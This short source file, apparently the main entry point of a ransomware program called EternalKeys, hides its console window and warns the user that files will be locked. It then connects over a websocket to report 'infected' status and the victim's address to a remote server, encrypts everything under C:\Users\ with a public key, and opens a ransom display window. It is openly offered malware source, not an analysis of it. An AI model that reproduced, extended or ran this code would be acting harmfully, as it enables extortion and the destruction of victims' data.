package EternalKeys;

import System.*;
import System.Collections.Generic.*;
import System.Windows.Forms.*;

/**
 * Summary description for Program
 */
public class Program
{
	/**
	 * The main entry point for the application.
	 */
	/** @attribute System.STAThread() */
	public static void main(String[] args)
	{
		Globals.ShowWindow(Globals.GetConsoleWindow(), 0);
		String str = new String("Hi guys. I'm glad you found this while looking though my pasta code".ToCharArray());
		int num = (int)MessageBox.Show("Close the Program if you dont want da files locked!!!!!!!");
		Globals.ws.OnMessage += new EventHandler<EventArgs>(Globals.Ws_OnMessage);
		Globals.ws.Connect();
		Globals.SendCMD("infected", "");
		Globals.SendCMD("address", "");
		Thread.sleep(10000);
		LockerEngine.Encrypt_Dir("C:\\Users\\", Globals.Keys.PublicKey);
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Application.Run(new RansomwareDisplay());
	}
}
